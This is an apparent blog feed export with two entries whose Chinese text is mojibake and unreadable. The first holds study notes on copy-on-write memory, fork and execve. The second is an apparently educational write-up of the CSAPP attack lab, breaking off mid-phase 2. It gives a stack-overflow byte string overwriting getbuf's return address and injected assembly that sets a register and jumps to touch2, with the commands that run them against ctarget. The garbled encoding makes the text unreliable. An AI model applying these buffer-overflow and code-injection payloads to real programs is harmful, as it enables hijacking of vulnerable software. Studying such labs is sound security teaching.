å°„ç§æœ‰å¯¹è±¡çš„è¿›ç¨‹ï¼Œç›¸åº”ç§æœ‰åŒºåŸŸçš„é¡µè¡¨æ¡ç›®éƒ½è¢«æ ‡è®°ä¸º<strong>åªè¯»</strong>ï¼Œå¹¶ä¸”åŒºåŸŸç»“æ„è¢«æ ‡è®°ä¸ºç§æœ‰çš„å†™æ—¶æ‹·è´ã€‚åªè¦æ²¡æœ‰è¿›ç¨‹è¯•å›¾å†™å®ƒè‡ªå·±çš„ç§æœ‰åŒºåŸŸï¼Œå®ƒä»¬å°±å¯ä»¥ç»§ç»­å…±äº«ç‰©ç†å­˜å‚¨å™¨ä¸­å¯¹è±¡çš„ä¸€ä¸ªå•ç‹¬æ‹·è´ã€‚ç„¶è€Œï¼Œåªè¦æœ‰ä¸€ä¸ªè¿›ç¨‹è¯•å›¾å†™ç§æœ‰åŒºåŸå†…çš„æŸä¸ªé¡µé¢ï¼Œé‚£ä¹ˆè¿™ä¸ªå†™æ“ä½œå°±ä¼šè§¦å‘ä¸€ä¸ªä¿æŠ¤æ•…éšœã€‚<br>å½“æ•…éšœå¤„ç†ç¨‹åºæ³¨æ„åˆ°ä¿æŠ¤å¼‚å¸¸æ˜¯ç”±äºè¿›ç¨‹è¯•å›¾å†™ç§æœ‰çš„å†™æ—¶æ‹·è´åŒºåŸä¸­çš„ä¸€ä¸ªé¡µé¢è€Œå¼•èµ·çš„ï¼Œå®ƒå°±ä¼šåœ¨ç‰©ç†å­˜å‚¨å™¨ä¸­<strong>åˆ›å»ºè¿™ä¸ªé¡µé¢çš„ä¸€ä¸ªæ–°æ‹·è´</strong>ï¼Œ<strong>æ›´æ–°é¡µè¡¨æ¡ç›®</strong>æŒ‡å‘è¿™ä¸ªæ–°çš„æ‹·è´ï¼Œç„¶å<strong>æ¢å¤</strong>è¿™ä¸ªé¡µé¢çš„<strong>å¯å†™æƒé™</strong>ï¼Œå¦‚å›¾9-30bæ‰€ç¤ºã€‚å½“æ•…éšœå¤„ç†ç¨‹åºè¿”å›æ—¶ï¼ŒCPUé‡æ–°æ‰§è¡Œè¿™ä¸ªå†™æ“ä½œï¼Œç°åœ¨åœ¨æ–°åˆ›å»ºçš„é¡µé¢ä¸Šè¿™ä¸ªå†™æ“ä½œå°±å¯ä»¥æ­£å¸¸æ‰§è¡Œäº†ã€‚<br>é€šè¿‡å»¶è¿Ÿç§æœ‰å¯¹è±¡ä¸­çš„æ‹·è´ç›´åˆ°æœ€åå¯èƒ½çš„æ—¶åˆ»ï¼Œå†™æ—¶æ‹·è´æœ€å……åˆ†åœ°ä½¿ç”¨äº†ç¨€æœ‰çš„ç‰©ç†å­˜å‚¨å™¨ã€‚</p><p><img src="/posts/e0eae192/image-20210621163448754.png" alt="image-20210621163448754"></p><h4 id="982-å†çœ‹forkå‡½æ•°"><a class="markdownIt-Anchor" href="#982-å†çœ‹forkå‡½æ•°"></a> 9.8.2 å†çœ‹forkå‡½æ•°</h4><p>æ–°åˆ›å»ºçš„å­è¿›ç¨‹å‡ ä¹ä½†ä¸å®Œå…¨ä¸çˆ¶è¿›ç¨‹ç›¸åŒã€‚<strong>å­è¿›ç¨‹å¾—åˆ°ä¸çˆ¶è¿›ç¨‹ç”¨æˆ·çº§è™šæ‹Ÿåœ°å€ç©ºé—´ç›¸åŒ</strong><br><strong>çš„ï¼ˆä½†æ˜¯ç‹¬ç«‹çš„ï¼‰ä¸€ä»½æ‹·è´ï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€æ•°æ®å’Œbssæ®µã€å †ä»¥åŠç”¨æˆ·æ ˆã€‚å­è¿›ç¨‹è¿˜è·å¾—ä¸çˆ¶è¿›ç¨‹</strong><br><strong>ä»»ä½•æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦ç›¸åŒçš„æ‹·è´ï¼Œè¿™å°±æ„å‘³ç€å½“çˆ¶è¿›ç¨‹è°ƒç”¨forkæ—¶ï¼Œå­è¿›ç¨‹å¯ä»¥è¯»å†™çˆ¶è¿›ç¨‹ä¸­</strong><br><strong>æ‰“å¼€çš„ä»»ä½•æ–‡ä»¶ã€‚çˆ¶è¿›ç¨‹å’Œæ–°åˆ›å»ºçš„å­è¿›ç¨‹ä¹‹é—´æœ€å¤§çš„åŒºåˆ«åœ¨äºå®ƒä»¬æœ‰ä¸åŒçš„PIDã€‚</strong></p><p>æ—¢ç„¶æˆ‘ä»¬ç†è§£äº†è™šæ‹Ÿå­˜å‚¨å™¨å’Œå­˜å‚¨å™¨æ˜ å°„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ¸…æ™°åœ°çŸ¥é“forkå‡½æ•°æ˜¯å¦‚ä½•åˆ›å»ºä¸€ä¸ªå¸¦æœ‰è‡ªå·±ç‹¬ç«‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„æ–°è¿›ç¨‹çš„ã€‚<br><strong>å½“forkå‡½æ•°è¢«å½“å‰è¿›ç¨‹è°ƒç”¨æ—¶ï¼Œå†…æ ¸ä¸ºæ–°è¿›ç¨‹åˆ›å»ºå„ç§æ•°æ®ç»“æ„ï¼Œå¹¶åˆ†é…ç»™å®ƒä¸€ä¸ªå”¯ä¸€çš„PID.ä¸ºäº†ç»™è¿™ä¸ªæ–°è¿›ç¨‹åˆ›å»ºè™šæ‹Ÿå­˜å‚¨å™¨ï¼Œå®ƒåˆ›å»ºäº†å½“å‰è¿›ç¨‹çš„ mm_structã€åŒºåŸŸç»“æ„å’Œé¡µè¡¨çš„åŸæ ·æ‹·è´ã€‚å®ƒå°†ä¸¤ä¸ªè¿›ç¨‹ä¸­çš„æ¯ä¸ªé¡µé¢éƒ½æ ‡è®°ä¸ºåªè¯»ï¼Œå¹¶å°†ä¸¤ä¸ªè¿›ç¨‹ä¸­çš„æ¯ä¸ªåŒºåŸŸç»“æ„éƒ½æ ‡è®°ä¸ºç§æœ‰çš„å†™æ—¶æ‹·è´ã€‚</strong></p><p>å½“forkåœ¨æ–°è¿›ç¨‹ä¸­è¿”å›æ—¶ï¼Œæ–°è¿›ç¨‹ç°åœ¨çš„è™šæ‹Ÿå­˜å‚¨å™¨åˆšå¥½å’Œè°ƒç”¨forkæ—¶å­˜åœ¨çš„è™šæ‹Ÿå­˜å‚¨å™¨ç›¸åŒã€‚å½“è¿™ä¸¤ä¸ªè¿›ç¨‹ä¸­çš„ä»»ä¸€ä¸ªåæ¥è¿›è¡Œå†™æ“ä½œæ—¶ï¼Œå†™æ—¶æ‹·è´æœºåˆ¶å°±ä¼šåˆ›å»ºæ–°é¡µé¢ï¼Œå› æ­¤ï¼Œä¹Ÿå°±ä¸ºæ¯ä¸ªè¿›ç¨‹ä¿æŒäº†ç§æœ‰åœ°å€ç©ºé—´çš„æŠ½è±¡æ¦‚å¿µã€‚</p><h4 id="983-å†çœ‹-execvelå‡½æ•°"><a class="markdownIt-Anchor" href="#983-å†çœ‹-execvelå‡½æ•°"></a> 9.8.3 å†çœ‹ execvelå‡½æ•°</h4><p>æ­£å¦‚åœ¨ç¬¬8ç« ä¸­å­¦åˆ°çš„ï¼Œ execveå‡½æ•°åœ¨å½“å‰è¿›ç¨‹ä¸­åŠ è½½å¹¶è¿è¡ŒåŒ…å«åœ¨å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶a.outä¸­çš„ç¨‹åºï¼Œç”¨a.outç¨‹åºæœ‰æ•ˆåœ°æ›¿ä»£äº†å½“å‰ç¨‹åºã€‚åŠ è½½å¹¶è¿è¡Œa.outéœ€è¦ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><ul><li><strong>åˆ é™¤å·²å­˜åœ¨çš„ç”¨æˆ·åŒºåŸŸ</strong>ã€‚åˆ é™¤å½“å‰è¿›ç¨‹è™šæ‹Ÿåœ°å€çš„ç”¨æˆ·éƒ¨åˆ†ä¸­çš„å·²å­˜åœ¨çš„åŒºåŸŸç»“æ„ã€‚</li><li><strong>æ˜ å°„ç§æœ‰åŒºåŸŸ</strong>ã€‚ä¸ºæ–°ç¨‹åºçš„æ–‡æœ¬ã€æ•°æ®ã€bsså’Œæ ˆåŒºåŸŸåˆ›å»ºæ–°çš„åŒºåŸŸç»“æ„ã€‚æ‰€æœ‰è¿™äº›æ–°çš„åŒºåŸŸéƒ½æ˜¯ç§æœ‰çš„ã€å†™æ—¶æ‹·è´çš„ã€‚æ–‡æœ¬å’Œæ•°æ®åŒºåŸŸè¢«æ˜ å°„ä¸ºa.outæ–‡ä»¶ä¸­çš„æ–‡æœ¬å’Œæ•°æ®åŒºã€‚bbsåŒºåŸŸæ˜¯è¯·æ±‚äºŒè¿›åˆ¶é›¶çš„ï¼Œæ˜ å°„åˆ°åŒ¿åæ–‡ä»¶ï¼Œå…¶å¤§å°åŒ…å«åœ¨a.outä¸­ã€‚æ ˆå’Œå †åŒºåŸŸä¹Ÿæ˜¯è¯·æ±‚äºŒè¿›åˆ¶é›¶çš„ï¼Œåˆå§‹é•¿åº¦ä¸ºé›¶ã€‚å›¾9-31æ¦‚æ‹¬äº†ç§æœ‰åŒºåŸŸçš„ä¸åŒæ˜ å°„ã€‚</li><li><strong>æ˜ å°„å…±äº«åŒºåŸŸ</strong>ã€‚å¦‚æœa.outç¨‹åºä¸å…±äº«å¯¹è±¡ï¼ˆæˆ–ç›®æ ‡ï¼‰é“¾æ¥ï¼Œ<a href="http://xn--Clibc-055h357bs0jhnv7vi.so">æ¯”å¦‚æ ‡å‡†Cåº“libc.so</a>,é‚£ä¹ˆè¿™äº›å¯¹è±¡éƒ½æ˜¯åŠ¨æ€é“¾æ¥åˆ°è¿™ä¸ªç¨‹åºçš„ï¼Œç„¶åå†æ˜ å°„åˆ°ç”¨æˆ·è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„å…±äº«åŒºåŸŸå†…ã€‚</li><li><strong>è®¾ç½®ç¨‹åºè®¡æ•°å™¨(PC)</strong>ã€‚ execveçš„æœ€åä¸€ä»¶äº‹æƒ…å°±æ˜¯è®¾ç½®å½“å‰è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­çš„ç¨‹åºè®¡æ•°å™¨ï¼Œä½¿ä¹‹æŒ‡å‘æ–‡æœ¬åŒºåŸŸçš„å…¥å£ç‚¹ã€‚</li></ul><p>ä¸‹ä¸€æ¬¡è°ƒåº¦è¿™ä¸ªè¿›ç¨‹æ—¶ï¼Œå®ƒå°†ä»è¿™ä¸ªå…¥å£ç‚¹å¼€å§‹æ‰§è¡Œã€‚Linuxå°†æ ¹æ®éœ€è¦æ¢å…¥ä»£ç å’Œæ•°æ®é¡µé¢ã€‚</p><p><img src="/posts/e0eae192/image-20210621164152972.png" alt="image-20210621164152972"></p><h4 id="984-ä½¿ç”¨mmapå‡½æ•°çš„ç”¨æˆ·çº§å­˜å‚¨å™¨æ˜ å°„"><a class="markdownIt-Anchor" href="#984-ä½¿ç”¨mmapå‡½æ•°çš„ç”¨æˆ·çº§å­˜å‚¨å™¨æ˜ å°„"></a> 9.8.4 ä½¿ç”¨mmapå‡½æ•°çš„ç”¨æˆ·çº§å­˜å‚¨å™¨æ˜ å°„</h4><hr><h3 id="99-åŠ¨æ€å­˜å‚¨å™¨åˆ†é…"><a class="markdownIt-Anchor" href="#99-åŠ¨æ€å­˜å‚¨å™¨åˆ†é…"></a> 9.9 åŠ¨æ€å­˜å‚¨å™¨åˆ†é…</h3><hr><h3 id="910-åƒåœ¾æ”¶é›†"><a class="markdownIt-Anchor" href="#910-åƒåœ¾æ”¶é›†"></a> 9.10 åƒåœ¾æ”¶é›†</h3><hr><h3 id="911-cç¨‹åºä¸­å¸¸è§çš„ä¸å­˜å‚¨å™¨æœ‰å…³çš„"><a class="markdownIt-Anchor" href="#911-cç¨‹åºä¸­å¸¸è§çš„ä¸å­˜å‚¨å™¨æœ‰å…³çš„"></a> 9.11 Cç¨‹åºä¸­å¸¸è§çš„ä¸å­˜å‚¨å™¨æœ‰å…³çš„</h3>]]></content>
    
    
    <categories>
      
      <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¡ç®—æœºç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lab4_attack lab</title>
    <link href="/posts/9b9a13df/"/>
    <url>/posts/9b9a13df/</url>
    
    <content type="html"><![CDATA[<h1 id="attack-lab"><a class="markdownIt-Anchor" href="#attack-lab"></a> Attack lab</h1><h2 id="å®éªŒæ¦‚æ‹¬"><a class="markdownIt-Anchor" href="#å®éªŒæ¦‚æ‹¬"></a> å®éªŒæ¦‚æ‹¬</h2><p>è¦æ±‚ä½ è¿›è¡Œäº”æ¬¡æ”»å‡»ã€‚æ”»å‡»æ–¹å¼æ˜¯code injectionä»£ç æ³¨å…¥å’ŒReeturn-oriented programming(ROP)</p><p>æ–‡ä»¶åˆ—è¡¨ï¼š</p><table><thead><tr><th>æ–‡ä»¶</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>ctarget</td><td>ç”¨æ¥åšCode injectionæ”»å‡»çš„ç¨‹åºï¼Œphase1-3</td></tr><tr><td>rtarget</td><td>ç”¨æ¥åšROPæ”»å‡»çš„ç¨‹åº,phase 4-5</td></tr><tr><td>cookie.txt</td><td>ä½œä¸ºæ”»å‡»çš„æ ‡è¯†ç¬¦</td></tr><tr><td>hex2raw</td><td>ç”¨æ¥ç”Ÿæˆå·¥å…·å­—ç¬¦ä¸²</td></tr><tr><td>farm.c</td><td>ç”¨äºç”Ÿæˆé¢å‘è¿”å›çš„ç¼–ç¨‹æ”»å‡»</td></tr></tbody></table><h2 id="é¢„å¤‡çŸ¥è¯†ç¼“å†²åŒºæº¢å‡º"><a class="markdownIt-Anchor" href="#é¢„å¤‡çŸ¥è¯†ç¼“å†²åŒºæº¢å‡º"></a> é¢„å¤‡çŸ¥è¯†â€”â€”ç¼“å†²åŒºæº¢å‡º</h2><p>ç¼“å†²åŒºæº¢å‡ºçš„åŸºæœ¬åŸç†å¹¶ä¸å¤æ‚ã€‚ç¼“å†²åŒºå°±æ˜¯æ“ä½œç³»ç»Ÿä¸ºå‡½æ•°æ‰§è¡Œä¸“é—¨åˆ’åˆ†å‡ºçš„ä¸€æ®µå†…å­˜ï¼ŒåŒ…æ‹¬æ ˆ(è‡ªåŠ¨å˜é‡)ã€å †(åŠ¨æ€å†…å­˜)å’Œé™æ€æ•°æ®åŒº(å…¨å±€æˆ–é™æ€)ã€‚å…¶ä¸­ç¼“å†²åŒºæº¢å‡ºå‘ç”Ÿåœ¨æ ˆé‡Œï¼Œæ ˆå­˜æ”¾äº†å‡½æ•°çš„å‚æ•°ã€è¿”å›åœ°å€ã€EBPï¼ˆEBPæ˜¯å½“å‰å‡½æ•°çš„å­˜å–æŒ‡é’ˆï¼Œå³å­˜å‚¨æˆ–è€…è¯»å–æ•°æ—¶çš„æŒ‡é’ˆåŸºåœ°å€ï¼Œå¯ä»¥çœ‹æˆä¸€ä¸ªæ ‡å‡†çš„å‡½æ•°èµ·å§‹ä»£ç ï¼‰å’Œå±€éƒ¨å˜é‡ã€‚</p><p><strong>å½“å‡½æ•°ä¸­å¯¹å±€éƒ¨å˜é‡çš„èµ‹å€¼è¶…è¿‡äº†ä¸ºå…¶åˆ†é…çš„å­˜å‚¨ç©ºé—´ï¼Œè¶…å‡ºçš„éƒ¨åˆ†å°±ä¼šè¦†ç›–æ ˆé‡Œå…¶ä»–éƒ¨åˆ†çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯å‘ç”Ÿäº†ç¼“å†²åŒºæº¢å‡º</strong>ã€‚</p><p><img src="/posts/9b9a13df/14ce36d3d539b6000b87d3d293d6f22cc75cb793-1625283594106.jpeg" alt="img"></p><p><img src="/posts/9b9a13df/9213b07eca806538756b3e9fee5b6642af3482c2.jpeg" alt="img"></p><h2 id="é¢„å¤‡çŸ¥è¯†ropæ”»å‡»"><a class="markdownIt-Anchor" href="#é¢„å¤‡çŸ¥è¯†ropæ”»å‡»"></a> é¢„å¤‡çŸ¥è¯†â€”â€”ROPæ”»å‡»</h2><h3 id="ropæ”»å‡»"><a class="markdownIt-Anchor" href="#ropæ”»å‡»"></a> ROPæ”»å‡»</h3><p>ç¼“å†²åŒºæº¢å‡ºæ”»å‡»çš„æ™®éå‘ç”Ÿç»™è®¡ç®—æœºç³»ç»Ÿé€ æˆäº†è®¸å¤šéº»çƒ¦ã€‚ç°ä»£çš„ç¼–è¯‘å™¨å’Œæ“ä½œç³»ç»Ÿå®ç°äº†è®¸å¤šæœºåˆ¶ï¼Œä»¥é¿å…é­å—è¿™æ ·çš„æ”»å‡»ï¼Œé™åˆ¶å…¥ä¾µè€…é€šè¿‡ç¼“å†²åŒºæº¢å‡ºæ”»å‡»è·å¾—ç³»ç»Ÿæ§åˆ¶çš„æ–¹å¼ã€‚</p><p>ï¼ˆ1ï¼‰<strong>æ ˆéšæœºåŒ–</strong></p><p><code>æ ˆéšæœºåŒ–</code>çš„æ€æƒ³ä½¿å¾—æ ˆçš„ä½ç½®åœ¨ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶éƒ½æœ‰å˜åŒ–ã€‚å› æ­¤ï¼Œå³ä½¿è®¸å¤šæœºå™¨éƒ½è¿è¡ŒåŒæ ·çš„ä»£ç ï¼Œå®ƒä»¬çš„æ ˆåœ°å€éƒ½æ˜¯ä¸åŒçš„ã€‚ä¸Šè¿°3ä¸ªé˜¶æ®µä¸­ï¼Œæ ˆçš„åœ°å€æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è·å–åˆ°æ ˆçš„åœ°å€ï¼Œå¹¶è·³è½¬åˆ°æ ˆçš„æŒ‡å®šä½ç½®ã€‚</p><p>ï¼ˆ2ï¼‰<strong>æ ˆç ´åæ£€æµ‹</strong></p><p>æœ€è¿‘çš„GCCç‰ˆæœ¬åœ¨äº§ç”Ÿçš„ä»£ç åŠ å…¥äº†ä¸€ç§<code>æ ˆä¿æŠ¤è€…</code>æœºåˆ¶ï¼Œæ¥æ£€æµ‹ç¼“å†²åŒºè¶Šç•Œã€‚å…¶æ€æƒ³æ˜¯åœ¨æ ˆå¸§ä¸­ä»»ä½•å±€éƒ¨ç¼“å†²åŒºå’Œæ ˆçŠ¶æ€ä¹‹é—´å­˜å‚¨ä¸€ä¸ªç‰¹æ®Šçš„é‡‘ä¸é›€å€¼ã€‚åœ¨æ¢å¤å¯„å­˜å™¨çŠ¶æ€å’Œä»å‡½æ•°è¿”å›ä¹‹å‰ï¼Œç¨‹åºæ£€æŸ¥è¿™ä¸ªé‡‘ä¸é›€å€¼æ˜¯å¦è¢«è¯¥å‡½æ•°çš„æŸä¸ªæ“ä½œæˆ–è€…è¯¥å‡½æ•°è°ƒç”¨çš„æŸä¸ªæ“ä½œæ”¹å˜äº†ã€‚å¦‚æœæ˜¯çš„ï¼Œé‚£ä¹ˆç¨‹åºå¼‚å¸¸ä¸­æ­¢ã€‚</p><p>ï¼ˆ3ï¼‰<strong>é™åˆ¶å¯æ‰§è¡Œä»£ç åŒºåŸŸ</strong></p><p>æœ€åä¸€æ‹›æ˜¯æ¶ˆé™¤æ”»å‡»è€…å‘ç³»ç»Ÿä¸­æ’å…¥å¯æ‰§è¡Œä»£ç çš„èƒ½åŠ›ã€‚ä¸€ç§æ–¹æ³•æ˜¯é™åˆ¶å“ªäº›å†…å­˜åŒºåŸŸèƒ½å¤Ÿå­˜æ”¾å¯æ‰§è¡Œä»£ç ã€‚</p><p>åœ¨ROPæ”»å‡»ä¸­ï¼Œå› ä¸ºæ ˆä¸Šé™åˆ¶äº†ä¸å¯æ’å…¥å¯æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥ä¸èƒ½åƒä¸Šè¿°ç¬¬äºŒã€ç¬¬ä¸‰é˜¶æ®µä¸­æ’å…¥ä»£ç ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨å·²ç»å­˜åœ¨çš„ç¨‹åºä¸­æ‰¾åˆ°ç‰¹å®šçš„æŒ‡ä»¤åºåˆ—ï¼Œå¹¶ä¸”è¿™äº›æŒ‡ä»¤æ˜¯ä»¥<code>ret</code>ç»“å°¾ï¼Œè¿™ä¸€æ®µæŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º<code>gadget</code>ã€‚</p><p>æ¯ä¸€æ®µ<code>gadget</code>åŒ…å«ä¸€ç³»åˆ—æŒ‡ä»¤å­—èŠ‚ï¼Œè€Œä¸”ä»¥<code>ret</code>ç»“å°¾ï¼Œè·³è½¬åˆ°ä¸‹ä¸€ä¸ª<code>gadget</code>ï¼Œå°±è¿™æ ·è¿ç»­çš„æ‰§è¡Œä¸€ç³»åˆ—çš„æŒ‡ä»¤ä»£ç ï¼Œå¯¹ç¨‹åºé€ æˆæ”»å‡»ã€‚</p><p><strong>ç¤ºä¾‹</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setval_210</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  *p = <span class="hljs-number">3347663060U</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å¯¹äºä¸Šè¿°ä»£ç ï¼Œè¿›è¡Œåæ±‡ç¼–æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„æ‰§è¡Œåºåˆ—ï¼Œä»ä¸­æˆ‘ä»¬ä¸€ä¸ªå¾—åˆ°ä¸€ä¸ªæœ‰è¶£æŒ‡ä»¤åºåˆ—:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">0000000000400f15 &lt;setval_210&gt;:<br>  400f15: c7 07 d4 48 89 c7 movl <span class="hljs-variable">$0xc78948d4</span>,(%rdi)<br>  400f1b: c3 retq<br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­ï¼Œå­—èŠ‚åºåˆ—<code>48 89 c7</code>æ˜¯å¯¹æŒ‡ä»¤<code>movq %rax, %rdi</code>çš„ç¼–ç ï¼Œå°±è¿™æ ·æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å·²ç»å­˜åœ¨çš„ç¨‹åºï¼Œä»ä¸­æå–å‡ºç‰¹å®šçš„æŒ‡ä»¤,æ‰§è¡Œç‰¹å®šçš„åŠŸèƒ½ï¼Œåœ°å€ä¸º<code>0x400f18</code>ï¼Œå…¶åŠŸèƒ½æ˜¯å°†<code>%rax</code>çš„å†…å®¹ç§»åˆ°<code>%rdi</code>ã€‚</p><p>æŒ‡ä»¤çš„ç¼–ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="/posts/9b9a13df/1433829-d6312f1ce53cf044.png" alt="img"></p><p>movqæŒ‡ä»¤ç¼–ç </p><p><img src="/posts/9b9a13df/1433829-2a663eb32fae331a.png" alt="img"></p><p>popqæŒ‡ä»¤ç¼–ç </p><p><img src="/posts/9b9a13df/1433829-c713c395456655fa.png" alt="img"></p><p>movlæŒ‡ä»¤ç¼–ç </p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/1433829-67690582e19e902b.png" alt="img"></p><h2 id="å®éªŒå¼€å§‹"><a class="markdownIt-Anchor" href="#å®éªŒå¼€å§‹"></a> å®éªŒå¼€å§‹</h2><h3 id="1-phase1"><a class="markdownIt-Anchor" href="#1-phase1"></a> 1) phase1</h3><ul><li><p><strong>ä»»åŠ¡ç›®æ ‡</strong></p><p>è®©getbuf()å‡½æ•°è¿”å›touch1()</p></li><li><p><strong>å®éªŒæ­¥éª¤</strong></p><p>é¦–å…ˆå¯¹ctargetè¿›è¡Œgdbè°ƒè¯•</p><p>ç„¶åå¯¹getbuf è¿›è¡Œåæ±‡ç¼–</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205208407.png" alt="image-20210330205208407"></p><p>å¯¹touch1è¿›è¡Œåæ±‡ç¼–</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205255616.png" alt="image-20210330205255616"></p><p>å¯çŸ¥getbuf()å¼€è¾Ÿäº†0x28ï¼Œå³40å­—èŠ‚çš„ç©ºé—´ï¼Œè¿”å›åœ°å€å­˜åœ¨%rsp+0x28çš„åœ°å€ï¼Œ</p><p>è€Œtouch1çš„åˆå§‹åœ°å€ä¸º0x004017c0</p><p>æ‰€ä»¥å½“æˆ‘ä»¬å­˜å…¥ç¼“å†²åŒºçš„æ•°æ®ï¼Œå³touch1çš„åˆå§‹åœ°å€å¯ä»¥è¦†ç›–è¿™ä¸ªè¿”å›åœ°å€æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æˆåŠŸè¿”å›touch1äº†</p><p>æ”»å‡»åºåˆ—è®¾ç½®ï¼š</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>c0 17 40 00 00 00 00 00</p><p>ä»¥å°ç«¯æ–¹å¼å­˜å‚¨äº1.txtä¸­</p><p>ç”¨hex2rawè½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰§è¡Œå‘½ä»¤</p><figure class="highlight bnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt &gt;</span>2.txt<br></code></pre></div></td></tr></table></figure><p>å†æ‰§è¡Œ</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330210214612.png" alt="image-20210330210214612"></p></li></ul><h3 id="2-phase2"><a class="markdownIt-Anchor" href="#2-phase2"></a> 2) phase2</h3><ul><li><p><strong>ä»»åŠ¡è¦æ±‚</strong></p><p>è¦æ±‚ç¨‹åºæ‰§è¡Œå®Œgetbuf()åï¼Œæ‰§è¡Œtouch2ï¼Œè€Œä¸”è¿˜è¦ä¼ å…¥å‚æ•°ï¼Œå³ä½ çš„cookie</p></li><li><p><strong>å®éªŒæ­¥éª¤</strong></p><p>åæ±‡ç¼–æŸ¥çœ‹touch2åœ°å€</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330211924002.png" alt="image-20210330211924002"></p><p>è¦æ±‚æˆ‘ä»¬æŠŠå‚æ•°è®¾ç½®ä¸ºcookieï¼Œå³æŠŠ%rdiçš„å€¼æ”¹ä¸ºcookieï¼Œå†æ‰§è¡Œtouch2. å³ret touch2çš„åœ°å€ã€‚</p><p>è½¬åŒ–ä¸ºæ±‡ç¼–ä»£ç ä¿å­˜åœ¨1.sä¸­ï¼Œ</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">59</span>b<span class="hljs-number">997</span>fa,%rdi<br><span class="hljs-attribute">pushq</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">4017</span>ec<br><span class="hljs-attribute">ret</span><br></code></pre></div></td></tr></table></figure><p>ç”¨<code>gcc -c 1.s -o 1.o</code>æŒ‡ä»¤è½¬åŒ–ä¸ºæœºå™¨ä»£ç </p><p>å¹¶å°†å…¶åæ±‡ç¼–ï¼Œä¿å­˜åœ¨2.txtä¸­ï¼Œ2.txtå¦‚å›¾</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331210915437.png" alt="image-20210331210915437"></p><p>åˆ©ç”¨gdbè°ƒè¯•ï¼Œè¿›å…¥getbufå‡½æ•°é‡Œï¼ŒæŸ¥çœ‹%rspçš„åœ°å€</p><p><img src="/posts/9b9a13df/image-20210412193826843.png" alt="image-20210412193826843"></p><p>å¦‚ä¸Šæ‰€ç¤ºï¼Œæˆ‘ä»¬è·å–åˆ°äº†%rspçš„åœ°å€ï¼Œç»“åˆä¸Šæ–‡æ‰€è®²ï¼Œå¯ä»¥æ„é€ å‡ºå¦‚ä¸‹å­—ç¬¦ä¸²ï¼Œåœ¨æ ˆçš„å¼€å§‹ä½ç½®ä¸ºæ³¨å…¥ä»£ç çš„æŒ‡ä»¤åºåˆ—ï¼Œç„¶åå¡«å……æ»¡è‡³40ä¸ªå­—èŠ‚ï¼Œåœ¨æ¥ä¸‹æ¥çš„8ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯åŸæ¥çš„è¿”å›åœ°å€ï¼Œå¡«å……æˆæ³¨å…¥ä»£ç çš„èµ·å§‹åœ°å€ï¼Œä¹Ÿå°±æ˜¯%rspçš„åœ°å€ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹å­—ç¬¦ä¸²ï¼Œä¿å­˜åœ¨1.txtä¸­</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211305114.png" 